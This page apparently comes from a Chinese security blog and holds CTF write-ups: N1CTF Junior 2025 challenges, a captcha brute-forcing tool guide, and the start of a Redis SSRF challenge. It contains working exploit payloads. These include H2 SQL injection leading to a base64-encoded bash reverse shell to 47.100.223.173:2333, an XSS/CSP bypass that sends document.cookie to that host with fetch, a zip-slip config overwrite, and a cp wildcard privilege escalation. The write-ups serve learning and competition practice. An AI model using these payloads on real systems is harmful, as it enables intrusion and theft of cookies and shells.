\u0026#34;\u0026#34;\u0026#34;Sends given `path` to the HTTP server. Returns the response. \u0026#34;\u0026#34;\u0026#34; cookie = {\u0026#34;username\u0026#34;: \u0026#34;fupanc\u0026#34;, \u0026#34;password\u0026#34;: \u0026#34;123\u0026#34;} self.session.post(\u0026#34;http://localhost:8000/register.php\u0026#34;, data=cookie) # cookie = {\u0026#34;username\u0026#34;:\u0026#34;fupanc\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;123\u0026#34;} # self.session.post(\u0026#34;http://localhost:8000/login.php\u0026#34;,data=cookie) return self.session.post(self.url, data={\u0026#34;url\u0026#34;: path}) def download(self, path: str) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Returns the contents of a remote file. \u0026#34;\u0026#34;\u0026#34; path = f\u0026#34;php://filter/convert.base64-encode/resource={path}\u0026#34; self.send(path) response=self.session.get(\u0026#34;http://localhost:8000/avatar.php?user=fupanc\u0026#34;) data = response.re.search(b\u0026#34;(.*)\u0026#34;, flags=re.S).group(1) return base64.decode(data) 然后打就行了：\n最后访问flag.txt得到flag：\n这里很服的一点是，审代码确实是审出来可以直接在register.php获取到cookie，但是一直打不出来，后面复现的时候发现，就是因为我想要让端口更多元，没有使用docker-compose，导致一直打不出来：\n最后尝试使用docker-compose才打出来的。没错！就是在register.php就可以获取到cookie。\n——————\ntraefik go语言，同样给了源代码。简单审计一下，直接在flag路由就可以获取到flag了：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 r.GET(\u0026#34;/flag\u0026#34;, func(c *gin.Context) { xForwardedFor := c.GetHeader(\u0026#34;X-Forwarded-For\u0026#34;) if !strings.Contains(xForwardedFor, \u0026#34;127.0.0.1\u0026#34;) { c.JSON(400, gin.H{\u0026#34;error\u0026#34;: \u0026#34;only localhost can get flag\u0026#34;}) return } flag := os.Getenv(\u0026#34;FLAG\u0026#34;) if flag == \u0026#34;\u0026#34; { flag = \u0026#34;flag{testflag}\u0026#34; } c.String(http.StatusOK, flag) }) 有请求头检测，伪造一下就行。但是直接访问发现是404。那么继续审代码可以发现是文件上传+unzip，想到了zip slip，可以任意文件覆盖，审计源码，在unzip时使用的jion()函数：\n可以目录穿越尝试覆盖文件，就是打zip slip了，如下文章：\nhttps://saucer-man.com/information_security/364.html\n直接用里面的脚本就行。但是现在需要看在哪里覆盖文件，经过搜索以及翻和审计docker文件，发现traefik就是一个反代理工具，并且通过dynamic.yml文件来进行路由流量的转接：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # Dynamic configuration http: services: proxy: loadBalancer: servers: - url: \u0026#34;http://127.0.0.1:8080\u0026#34; routers: index: rule: Path(`/public/index`) entrypoints: [web] service: proxy upload: rule: Path(`/public/upload`) entrypoints: [web] service: proxy 可以看到这里是没有放行flag路由的。那么就需要尝试伪造一下，注意看这里的注释可以知道是动态配置的，那么就是unzio时解压来覆盖dynamic.yml达到允许flag路由通过的效果。\n最开始是直接仿造到上面这个改改就行：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 # Dynamic configuration http: services: proxy: loadBalancer: servers: - url: \u0026#34;http://127.0.0.1:8080\u0026#34; routers: index: rule: Path(`/public/index`) entrypoints: [web] service: proxy upload: rule: Path(`/public/upload`) entrypoints: [web] service: proxy flag: rule: Path(`/flag`) entrypoints: [web] service: proxy 成功覆盖后可以访问flag路由了，尝试直接在请求头中用XFF来伪造。但是始终获取不到flag。后面就想，是不是这个traefik工具是不是不会转发原请求头的内容，可以自己改一下go的源码来讲请求头打印出来，最后发现确实是：\n会自动转发真实ip。\n打的话，生成文件用下面这个脚本就行：\n1 2 3 4 5 6 7 import zipfile # the name of the zip file to generate zf = zipfile.ZipFile(\u0026#39;out.zip\u0026#39;, \u0026#39;w\u0026#39;) # the name of the malicious file that will overwrite the origial file (must exist on disk) fname = \u0026#39;dynamic.yml\u0026#39; #destination path of the file zf.write(fname, \u0026#39;../../.config/dynamic.yml\u0026#39;) 有docker，看一下目录结构就知道怎么穿了，或者直接多几个../穿到根目录然后覆盖/app/.config/dynamic.yml就行。\n————\n搜一下覆盖请求头，可以拿到如下文章：\nhttps://www.azfum.com/archives/wswfale/\n里面就提到了可以覆盖请求头，用middlewares:就行，所以使用的dynamic.yml：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 http: services: proxy: loadBalancer: servers: - url: \u0026#34;http://127.0.0.1:8080\u0026#34; routers: index: rule: Path(`/public/index`) entrypoints: [web] service: proxy upload: rule: Path(`/public/upload`) entrypoints: [web] service: proxy flag: rule: Path(`/flag`) entrypoints: [web] service: proxy middlewares: - xff-rewrite middlewares: xff-rewrite: headers: customRequestHeaders: X-Forwarded-For: \u0026#34;127.0.0.1\u0026#34; 生成zip文件后，上传：\n解压成功：\n最后再访问flag路由即可：\n拿到flag。\nbackup 简单得RCE ————————\n这道题没有docker，简单创了一个docker环境来测试，打的时候棋差一招呀，没找对选项。具体看wp吧。\n一开始看页面源代码看到命令执行的地方$_REQUEST[\u0026quot;__2025.happy.new.year\u0026quot;]，非法参数名问题，post传参就行：_[2025.happy.new.year，直接bash弹个shell，原文件的外面套的system()函数，所以直接传命令就行了（hackbar传参的话需要url编码再传）：\n这里的/flag是400权限，需要提权。\n根目录有一个/backup.sh 文件，文件内容为：\n1 2 3 4 5 6 7 8 9 #!/bin/bash cd /var/www/html/primary while : do cp -P * /var/www/html/backup/ chmod 755 -R /var/www/html/backup/ sleep 15s done sh文件内容就不多说了，每隔一段时间就会运行一次，ps -aux命令看一下是否在运行：\n在运行，并且是root权限。基本你可以确定是打这个来提权了。\n看到这里的*，很熟悉的通配符提权，并且涉及到了cp命令，primary目录可写文件。如果可以创建名为../../../../flag的文件，那么很快就出了，但是在shell中，只会将/视作目录，所以是打不了的。\n后面找思路，想到了软链接，那么就是想着软链接链接到/flag目录，然后sh脚本会将软链接带的内容一起给设置为可读权限，需要注意的是，这里使用了-P选项，这个在cp时不会带符号链接，所以需要绕一下。网上搜，说是-a选项可以，打了一下没打出来，后面就没怎么打了。\n赛后再搜了一下，-L选项是可以打的，也就是说-L选项会让cp命令复制软链接指向的文件，而-P选项，只会复制软链接本身，所以打不了。\n参考文章：\nhttps://www.cnblogs.com/chentiao/p/17363300.html\n最后尝试如下：\n1 2 3 4 5 cd /var/www/html/primary echo \u0026gt; -L ln -s /flag flag123 cd ../backup cat flag123 就可以得到flag。需要注意，要等sh脚本执行完了再打：\n看j1rry师傅的文章，还可以打-H选项，是直接从cp --h选项里面翻出来的，学习一下，感觉通配符提权基本都是考的利用选项来提权。\nEasyDB java题，跟着复现一下。\njadx反编译一下，拿到本地来看一源码。审计路由，发现存在登录路由：\n跟进的代码查看，发现存在sql注入：\n这里是直接拼接进的username和password，所以是存在sql注入的。\n看一下是什么数据库：\nh2数据库，道行还浅，以为是打JDBC，搜到一个打H2数据库的文章：\nhttps://xz.aliyun.com/news/13371\n里面提到了一个如果可以执行任意H2 SQL的语句，可以通过Alias Script 来进行RCE，打的堆叠注入。参考如下代码：\n1 2 3 4 5 6 //创建别名，其实就是创建一个执行函数： CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException { java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$; //调用SHELLEXEC执行命令 CALL SHELLEXEC(\u0026#39;id\u0026#39;); CALL SHELLEXEC(\u0026#39;whoami\u0026#39;); 看代码，可以知道这个是直接会将命令执行的结果回显到页面上的，那么现在就是看怎么进行注入。\n需要注意的是，在提交sql语句查询时，会先check()一下：\n也就是说有黑名单，黑名单如上。看了一下，是加了小写的，所以这里主要需要绕的是runtime和exec，看这个创建别名的语句，其实就是在里面自定义了一段java命令执行的代码，和正常的Java语句没有什么却比，绕的话还是很好绕的，可以使用unicode编码关键字+反射来进行尝试：\n1 2 3 4 5 6 7 8 9 //创建别名，其实就是创建一个执行函数： CREATE ALIAS CMD AS $$ String cmd(String cmd) throws java.io.IOException { Class clazz= Class.forName(\u0026#34;java.lang.R\\u0075ntime\u0026#34;); java.lang.reflect.Method mGet = clazz.getDeclaredMethod(\u0026#34;getR\\u0075ntime\u0026#34;); Object gettime = mGet.invoke(null); java.lang.reflect.Method exee = gettime.getClass().getDeclaredMethod(\u0026#34;e\\u0078ec\u0026#34;,String.class); exee.invoke(gettime,cmd);}$$; CALL CMD(\u0026#39;whoami\u0026#39;); 然后简单精简一下，如下：\n1 2 3 4 5 6 //创建别名，其实就是创建一个执行函数： CREATE ALIAS CMD AS $$ String cmd(String cmd) throws java.io.IOException { Object gettime = Class.forName(\u0026#34;java.lang.R\\u0075ntime\u0026#34;).getDeclaredMethod(\u0026#34;getR\\u0075ntime\u0026#34;).invoke(null); gettime.getClass().getDeclaredMethod(\u0026#34;e\\u0078ec\u0026#34;,String.class).invoke(gettime,cmd);}$$; CALL CMD(\u0026#39;whoami\u0026#39;); 尝试如下构造，然后拼接如下：\n1 2 3 SELECT * FROM users WHERE username = \u0026#39;admin\u0026#39;; CREATE ALIAS CMD AS $$ String cmd(String cmd) throws java.io.IOException { Object gettime = Class.forName(\u0026#34;java.lang.R\\u0075ntime\u0026#34;).getDeclaredMethod(\u0026#34;getR\\u0075ntime\u0026#34;).invoke(null); gettime.getClass().getDeclaredMethod(\u0026#34;e\\u0078ec\u0026#34;,String.class).invoke(gettime,cmd);}$$; CALL CMD(\u0026#39;whoami\u0026#39;); --\u0026#39; AND password = \u0026#39;%s\u0026#39; 这里是我是改成了没有回显的，直接在弹个shell即可：\n1 2 admin\u0026#39;; CREATE ALIAS CMD AS $$ String cmd(String cmd) throws Exception { Class clazz= Class.forName(\u0026#34;java.lang.R\\u0075ntime\u0026#34;);java.lang.reflect.Method mGet = clazz.getDeclaredMethod(\u0026#34;getR\\u0075ntime\u0026#34;);Object gettime = mGet.invoke(null);java.lang.reflect.Method exee = gettime.getClass().getDeclaredMethod(\u0026#34;e\\u0078ec\u0026#34;,String.class);exee.invoke(gettime,cmd);return \u0026#34;123\u0026#34;; }$$; CALL CMD(\u0026#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDAuMjIzLjE3My8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}\u0026#34;); -- 没弹上，直接被解析成了exec关键字？可能就是这个原因，被waf了。看了一下其他解法，这里还可以使用拼接，比如：\n1 2 admin\u0026#39;; CREATE ALIAS CMD AS $$ void cmd(String cmd) throws Exception { String name = \u0026#34;Run\u0026#34;+\u0026#34;time\u0026#34;;Class clazz= Class.forName(\u0026#34;java.lang.\u0026#34;+name);java.lang.reflect.Method mGet = clazz.getDeClaredMethod(\u0026#34;get\u0026#34;+name);Object gettime = (Object)mGet.invoke(null);gettime.getClass().getDeclaredMethod(\u0026#34;ex\u0026#34;+\u0026#34;ec\u0026#34;,String.class).invoke(gettime,cmd);}$$; CALL CMD(\u0026#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDAuMjIzLjE3My8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}\u0026#34;); -- 但是构造的语句总是有问题，直接用别人的了，大概如下：\n1 admin\u0026#39;; CREATE ALIAS evil AS $$void jerry(String cmd) throws Exception{ String R=\u0026#34;R\u0026#34;+\u0026#34;untime\u0026#34;;Class\u0026lt;?\u0026gt; c = Class.forName(\u0026#34;java.lang.\u0026#34;+R);Object rt=c.getMethod(\u0026#34;get\u0026#34;+R).invoke(null);c.getMethod(\u0026#34;exe\u0026#34;+\u0026#34;c\u0026#34;,String.class).invoke(rt,cmd);}$$;CALL evil(\u0026#39;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDAuMjIzLjE3My8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}\u0026#39;);-- 确实成功弹起了，对比了一下，问题可能存在于类型转换的问题。修修改改自己的poc，还是打不出来，不多纠结了。还可以base64编码这样打：\n1 \u0026#39;;CREATE ALIAS hello AS $$ String hello() throws Exception { Class c = Class.forName(new String(java.util.Base64.getDecoder().decode(\u0026#34;amF2YS5sYW5nLlJ1bnRpbWU=\u0026#34;)));java.lang.reflect.Method m1 = c.getMethod(new String(java.util.Base64.getDecoder().decode(\u0026#34;Z2V0UnVudGltZQ==\u0026#34;)));Object o = m1.invoke(null);java.lang.reflect.Method m2 = c.getMethod(new String(java.util.Base64.getDecoder().decode(\u0026#34;ZXhlYw==\u0026#34;)), String[].class);m2.invoke(o, new Object[]{new String[]{\u0026#34;/bin/bash\u0026#34;, \u0026#34;-c\u0026#34;, new String(java.util.Base64.getDecoder().decode(\u0026#34;YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMDAuMjIzLjE3My8yMzMzIDA+JjE=\u0026#34;))}});return null; }$$; CALL hello();-- 最后打就行了：\n注意url编码，以及这个别名应该只能创一次，否则需要重新开环境。最后拿到flag：\n——————\n参考：\nhttps://j1rry-learn.github.io/posts/2025-n1ctf-junior-web-%E6%96%B9%E5%90%91%E5%85%A8%E8%A7%A3/#gavatar\ndisplay hint：用iframe嵌入子页面可以重新唤起DOM解析器解析script标签\n——————\n同样是给了docker源码的，node.js。审计源代码，可以看到同样是一个XSS操作，然后有csp限制：\n1 2 3 4 5 6 const csp = \u0026#34;script-src \u0026#39;self\u0026#39;; object-src \u0026#39;none\u0026#39;; base-uri \u0026#39;none\u0026#39;;\u0026#34;; app.use((req, res, next) =\u0026gt; { res.setHeader(\u0026#39;Content-Security-Policy\u0026#39;, csp); next(); }); app.js文件内容，可以知道会将所有的路由都设置上了这个限制。\n看app.js文件，可以看到是对404页面进行了处理的：\n1 2 3 app.use((req, res) =\u0026gt; { res.status(200).type(\u0026#39;text/plain\u0026#39;).send(`${decodeURI(req.path)} : invalid path`); }); // 404 页面 这里和SekaiCTF 2024 Tagless题很像。那么现在来看一下回显：\n但是并不能解析为js代码：\n控制台也没有看到CSP限制的报错。\n再继续看代码，还可以看到有向bot发起请求的地方：\n跟进visit()就到了bot的定义代码，代码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 const puppeteer = require(\u0026#39;puppeteer\u0026#39;); const HOST = \u0026#39;localhost:3000\u0026#39;; const FLAG = process.env.FLAG ?? \u0026#39;flag{test}\u0026#39;; function sleep(ms) { return new Promise(resolve =\u0026gt; setTimeout(resolve, ms)); } const visit = async (text) =\u0026gt; { const browser = await puppeteer.launch({ headless: true, args: [\u0026#39;--no-sandbox\u0026#39;, \u0026#39;--disable-setuid-sandbox\u0026#39;] }); await browser.setCookie({ name: \u0026#39;flag\u0026#39;, value: FLAG, domain: HOST, path: \u0026#39;/\u0026#39;, httpOnly: false }); const page = await browser.newPage(); await page.goto(`http://${HOST}/?text=${encodeURI(text)}`); await sleep(5000); await page.close(); } module.exports = {visit}; 可以看到会在bot中带上flag。然后设置了httponly为false，可以通过XSS来获取。并且这里bot的访问逻辑是只访问/路由并带上我传参的text，这里就是需要利用的点。\n现在来看前端引用的js，是一个DOM型XSS：\n获取text参数，然后将其base64解码后再检验一下，check的函数内容为：\n1 2 3 4 5 6 7 function sanitizeContent(text) { // Only allow \u0026lt;h1\u0026gt;, \u0026lt;h2\u0026gt;, tags and plain text const config = { ALLOWED_TAGS: [\u0026#39;h1\u0026#39;, \u0026#39;h2\u0026#39;] }; return DOMPurify.sanitize(text, config); } 这里利用到了DOMPurify来检验，这是一个用于清理HTML、MathML和SVG的JavaScript的库，也就是可以用来防范XSS攻击。搜索这个库的漏洞，可以得到如下文章：\n《利用突变XSS绕过DOMPurify 2.0.0 》\n但是我们这里版本为DOMPurify 3.2.3，现在并没有现成的POC来打。\n在index.js文件中，有一个点值得注意一下：\n1 2 textInput.innerHTML = sanitizedText; // 写入预览区 contentDisplay.innerHTML = textInput.innerText; // 写入效果显示区 这里提到了innerHTML和innerText，用一个代码来说明这两个之间的区别：\n1 2 3 4 5 6 7 8 9 \u0026lt;div id=\u0026#34;example\u0026#34;\u0026gt; \u0026lt;p\u0026gt;Hello \u0026lt;strong\u0026gt;World\u0026lt;/strong\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; var content = document.getElementById(\u0026#34;example\u0026#34;); console.log(content.innerHTML); console.log(content.innerText); \u0026lt;/script\u0026gt; 输出为：\n1 2 3 \u0026lt;p\u0026gt;Hello \u0026lt;strong\u0026gt;World\u0026lt;/strong\u0026gt;\u0026lt;/p\u0026gt; Hello World 然后稍微改一点代码：\n1 2 3 4 5 6 7 8 9 \u0026lt;div id=\u0026#34;example\u0026#34;\u0026gt; \u0026lt;p\u0026gt;Hello \u0026amp;lt;strong\u0026amp;gt;World\u0026lt;/strong\u0026gt;\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;script\u0026gt; var content = document.getElementById(\u0026#34;example\u0026#34;); console.log(content.innerHTML); console.log(content.innerText); \u0026lt;/script\u0026gt; 输出为：\n1 2 3 \u0026lt;p\u0026gt;Hello \u0026amp;lt;strong\u0026amp;gt;World\u0026lt;/p\u0026gt; Hello \u0026lt;strong\u0026gt;World 从两个结果的对比，可以知道，这里的innerHTML用于获取或设置元素的 HTML 内容，包括所有的 HTML 标签，而innerText则是会解析HTML标签为文本，如果有HTML编码内容，那么就会将其解码一次。可以浅显理解为innerHTML就是获取全部HTML标签的内容，而innerText则是HTML渲染一次，类似于前端渲染的效果。\n那么这样看来，源代码是存在漏洞的，再粘过来一下：\n1 2 textInput.innerHTML = sanitizedText; // 写入预览区 contentDisplay.innerHTML = textInput.innerText; // 写入效果显示区 在这里，可以尝试将sanitizedText的内容HTML编码一下，然后textInput.innerText会将其渲染，也就是HTML解码一次。并将其赋值给了内容显示，这样我们就可以在前端显示一个HTML标签出来，尝试如下：\n编码：\n然后base64编码一次传进去。\n成功渲染：\n这里在预览时就在前端渲染成了一个标签。但是不会解析。\n经过前面的构造，那么contentDisplay前端渲染时就会被渲染为js标签：\n但是并没有解析，这是因为内容是动态放置在 \u0026lt;div\u0026gt; 内的，并且由于使用了innerHTML，因此脚本没有执行。这里主要的利用点在contentDisplay，通过将contentDisplay.innerHTML设置为一个正常的html标签，然后插入到DOM树中。（这段代码设计得秒呀）\n都是没有解析。那么看此时的Hint：用iframe嵌入子页面可以重新唤起DOM解析器解析script标签。\n那么是限制了\u0026lt;script\u0026gt;标签的解析？\n尝试一下在404页面使用\u0026lt;iframe\u0026gt;标签嵌入前面的/路由：\n似乎是因为?这个get传参符号后面全都被舍弃了？那么嵌套一下404页面：\n还是不行，同时，\u0026lt;iframe\u0026gt;标签的src属性还可以直接嵌套javascript协议来直接执行代码，如：\n1 \u0026lt;iframe src=\u0026#34;javascript:alert(1)\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; 同样的还有\u0026lt;iframe\u0026gt;还有一个srcdoc属性，这个属性可以直接引入\u0026lt;script\u0026gt;标签，如：\n1 \u0026lt;iframe srcdoc=\u0026#34;\u0026lt;h1\u0026gt;hello\u0026lt;/h1\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; 并且不受frame-src的影响，虽然这道题的CSP没有设置frame-src，但是可以注意一下，非常的好用。\n但是在这里都没有解析。\n对于\u0026lt;iframe\u0026gt;标签的利用，如下文章说的比较清楚：\nhttps://blog.huli.tw/2022/04/07/iframe-and-window-open/#iframe-%E7%9A%84-csp\n还是不会呀，看了一下别人的wp，是在/路由进行的弹窗，唉，思维还是定式了，还是想着sekaictf的那套打法，那么如下打（可以直接打src，也可以打srcdoc）：\n1 \u0026lt;iframe srcdoc=\u0026#34;\u0026lt;h1\u0026gt;hello\u0026lt;/h1\u0026gt;\u0026lt;script\u0026gt;alert(1)\u0026lt;/script\u0026gt;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; 用这个payload，还是之前的操作，HTML编码，然后base64编码。\n1 http://localhost:53447/?text=Jmx0O2lmcmFtZSBzcmNkb2M9IiZsdDtoMSZndDtoZWxsbyZsdDsvaDEmZ3Q7Jmx0O3NjcmlwdCZndDthbGVydCgxKSZsdDsvc2NyaXB0Jmd0OyImZ3Q7Jmx0Oy9pZnJhbWUmZ3Q7 最后效果如下：\n报错了，那么现在就是CSP绕过了，script-src设置为了self。这个就是sekaictf 2024的熟悉操作了，这里直接利用404页面构造即可，还是那个操作，本地引用，前面闭合成多行注释符，后面直接的那行注释掉，留一个完整的js代码，还是用fetch()函数：\n然后让iframe来自己引入这个页面：\n1 \u0026lt;iframe srcdoc=\u0026#34;\u0026lt;h1\u0026gt;hello\u0026lt;/h1\u0026gt;\u0026lt;script src=\u0026#34;/**/fetch(\u0026#39;http://47.100.223.173:2333/\u0026#39;+document.cookie)//\u0026#34;\u0026gt;\u0026lt;/script\u0026gt;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; 然后还是没弹成功，猜是不是这里两个双引号导致直接出错了，fetch()函数还可以使用反引号（`）指定地址，改成如下这个即可：\n1 \u0026lt;iframe srcdoc=\u0026#34;\u0026lt;h1\u0026gt;hello\u0026lt;/h1\u0026gt;\u0026lt;script src=\u0026#39;/**/fetch(`http://47.100.223.173:2333/`+document.cookie)//\u0026#39;\u0026gt;\u0026lt;/script\u0026gt;\u0026#34;\u0026gt;\u0026lt;/iframe\u0026gt; 然后还是之前的操作，HTML编码后在base64编码，注意要抓包传参，否则浏览器会url编码一次，导致无法成功：\n最后成功拿到flag：\n最后说明一个点：在其他题目中测试，同样的情况，\u0026lt;script\u0026gt;不解析，放在\u0026lt;div\u0026gt;标签中，应该同样是因为innerHTML，这个hint可以用来绕过这个点，并且其他题测试也是同样可以绕过的。\n————\n总结：很有意思的一道题，我还得练呀，还是应该想到还有/路由有前端渲染的操作，思维还得再开点。\n部分出题人的wp：\nhttps://gist.github.com/X1r0z/0c6a4323fd600a07091d6392cb9c77b5\n","date":"2025-02-17T00:19:41+08:00","permalink":"https://fupanc-w1n.github.io/p/n1ctf-junior-2025/","title":"N1CTF Junior 2025"},{"content":"验证码爆破 现在偶尔遇到验证码爆破这东西了，这里还是来记录一下配置及使用方法，但是这个爆破方法也只在一定情况下使用。\n对于验证码的其他情况，可以看一看第三个参考文章。\ncaptcha-killer-modified 工具配置 一个burp插件，地址：https://github.com/f0ng/captcha-killer-modified/releases/tag/0.24.3\n先在给的工具地址选下载与启动burp的java版本适配的jar包，我这里是直接看的本地java版本，所以这里直接选择java8即可：\n然后需要配置一下python的环境，这里需要安装如下的库：\n1 2 3 4 5 flask ddddocr Pillow==9.5.0 aiohttp==3.8.3 argparse==1.1 直接将其写入到一个requirements.txt文件一步下载即可，这里我用的python的版本是python3.8，写好后直接如下安装即可：\n1 pip38 install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple 后面使用时会使用如下脚本，现在先不说：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # -*- encoding=utf-8 -*- import argparse import ddddocr from aiohttp import web ocr = ddddocr.DdddOcr() async def handle_cb(request): return web.Response(text=ocr.classification(await request.text())) app = web.Application() app.add_routes([web.post(\u0026#39;/reg\u0026#39;, handle_cb)]) if __name__ == \u0026#39;__main__\u0026#39;: web.run_app(app,host=\u0026#39;127.0.0.1\u0026#39;,port=8881) 然后就是在burp上配置一下插件，直接在上边栏找到extension，然后如下配置即可：\n如下就是配置好了：\n后面就直接用一道题来说明后面该怎么用。\n例题说明 2024国城杯ez_Gallery 这里就简单说说验证码爆破的步骤，后续的解题就不说了。\n开题如下：\n可以看出来就是一个登录框+验证码，在这里我们可以看一下这个验证码的生成情况：\n经测试发现是通过一个url可查看，并且这里刷新一次换一个验证码，在这里我们直接将其发送给burp，并用captcha来获取:\n然后去到插件页面，点击获取，得到验证码即为成功（这里识别到了验证码，但是不用管，继续跟着后面走就行）：\n然后启动前面的python脚本：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # -*- encoding=utf-8 -*- import argparse import ddddocr from aiohttp import web ocr = ddddocr.DdddOcr() async def handle_cb(request): return web.Response(text=ocr.classification(await request.text())) app = web.Application() app.add_routes([web.post(\u0026#39;/reg\u0026#39;, handle_cb)]) if __name__ == \u0026#39;__main__\u0026#39;: web.run_app(app,host=\u0026#39;127.0.0.1\u0026#39;,port=8881) 再来到配置的下面部分，在Request template输入框中右键，选择ddddocr模板：\n然后将端口改成本地运行的端口并点击识别：\n然后就成功了：\n然后回到原先登录框这里，随便输入将其发送到爆破模块，将密码和验证码设置为变量：\npayload1就是正常的字典，Payload2如下设置，选择扩展生成：\n然后还可以设置一下资源池，注意应该需要调一下线程，新建一个就行，这里是设置的一秒一个请求，防止验证码被重复使用（确实需要调线程）：\n然后点击start，最后成功爆破出来：\n在工具的配置页面是可以看到识别效果的：\n——————\n一般验证码爆破适用于验证码是一个url生成的，还是多尝试。还有问题的话看参考文章。\nPKAV工具 地址：https://github.com/estell-yf/PKAV\n这里直接就是一个图形化工具，直接讲怎么用吧：\n[NSSCTF 3rd]NSS影院 NSS影视，你值得拥有\n——————\n开题，信息收集，可以知道是php，扫目录扫到www.zip，访问拿到源码，给了一个文件：\n感觉是一个字典，测了一下网站，应该是需要登录的，找了一圈，在咨询下有一个test：\n点进去就行，这是一个建站测试，可以看到作者，以及flag部分路径：\n即\n1 2 d3f4u1t /Fl4g_is_h3r3 再扫一下这个路径下的文件：\n访问login.php，就是一个登录框：\n然后可以打开验证码，发现是通过url来生成的验证码，这里先是尝试用captcha工具，然后成功爆破出来了：\n密码是 princess! ，登录进去就拿到了flag：\n——————\n但这里还是主要说明PKAV工具的使用：\n复制验证码的url到PKAV工具中：\n然后翻到下载点识别测试即可：\n然后抓登录的HTTP包，将其丢进PKAV工具：\n分别设置爆破的变量以及验证码标记。\n然后设置密码字典即可：\n再然后到重放选项页面设置，根据实际情况调整：\n然后在发包器开始爆破就行：\n最后也是成功爆破出来了：\n总的来说就是需要设置变体，验证码识别，重放选项，然后在发包器发包即可。\n但其实感觉直接使用burp插件就行了，也比较方便。\n参考配置文章：\nhttps://blog.csdn.net/qq_33906495/article/details/135367789\nhttps://www.52pojie.cn/thread-1944555-1-1.html\nhttps://blog.csdn.net/weixin_39190897/article/details/86539542\n","date":"2025-02-08T15:40:19+08:00","permalink":"https://fupanc-w1n.github.io/p/%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/","title":"验证码爆破"},{"content":"WEB CachedVisitor 有docker。这个比赛我也没有报名，以为不是CTF，早知道就和队友报了，不然就进线下了🥵。\n——————————\n给了docker，简单审一下docker，是执行的一个lua脚本，然后nginx后端。\n看了一下源代码：\nmain.lua：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 local function read_file(filename) local file = io.open(filename, \u0026#34;r\u0026#34;) if not file then print(\u0026#34;Error: Could not open file \u0026#34; .. filename) return nil end local content = file:read(\u0026#34;*a\u0026#34;) file:close() return content end local function execute_lua_code(script_content) local lua_code = script_content:match(\u0026#34;##LUA_START##(.-)##LUA_END##\u0026#34;) if lua_code then local chunk, err = load(lua_code) if chunk then local success, result = pcall(chunk) if not success then print(\u0026#34;Error executing Lua code: \u0026#34;, result) end else print(\u0026#34;Error loading Lua code: \u0026#34;, err) end else print(\u0026#34;Error: No valid Lua code block found.\u0026#34;) end end local function main() local filename = \u0026#34;/scripts/visit.script\u0026#34; local script_content = read_file(filename) if script_content then execute_lua_code(script_content) end end main() visit.script：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 ##LUA_START## local curl = require(\u0026#34;cURL\u0026#34;) local redis = require(\u0026#34;resty.redis\u0026#34;) ngx.req.read_body() local args = ngx.req.get_uri_args() local url = args.url if not url then ngx.say(\u0026#34;URL parameter is missing!\u0026#34;) return end local red = redis:new() red:set_timeout(1000) local ok, err = red:connect(\u0026#34;127.0.0.1\u0026#34;, 6379) if not ok then ngx.say(\u0026#34;Failed to connect to Redis: \u0026#34;, err) return end local res, err = red:get(url) if res and res ~= ngx.null then ngx.say(res) return end local c = curl.easy { url = url, timeout = 5, connecttimeout = 5 } local response_body = {} c:setopt_writefunction(table.insert, response_body) local ok, err = pcall(c.perform, c) if not ok then ngx.say(\u0026#34;Failed to perform request: \u0026#34;, err) c:close() return end c:close() local response_str = table.concat(response_body) local ok, err = red:setex(url, 3600, response_str) if not ok then ngx.say(\u0026#34;Failed to save response in Redis: \u0026#34;, err) return end ngx.say(response_str) ##LUA_END## 可以看到这里的代码运行，在visit.script文件就是一个连接redis，然后发送url请求的过程。\n在mian.lua中，可以知道主要逻辑就是运行visit.script文件。\n然后就看题吧。\n开题如下：\nssrf，并且可以读文件：\n但是不能直接读flag，权限不够：\n其实这个在dockerfile中是有说明的：\n1 2 3 4 COPY flag /flag COPY readflag /readflag RUN chmod 400 /flag RUN chmod +xs /readflag 可以看到赋予权限的操作。\n尝试打redis，这样先用dict协议查看一次redis的基本信息：\n可以看到redis的版本，这里应该是不能打redis主从复制的来getshell，看docker文件，是需要执行/readflag文件来读取文件的。\n错误做法 这里是先踩了一个坑的，也来记录一下，后端没有执行什么语言，所以不能写php文件，这里我想使用gopherus工具，所以只有用来尝试写定时任务来反弹shell：\n这里简单改一下payload即可，弹到2333端口去，如下：\n1 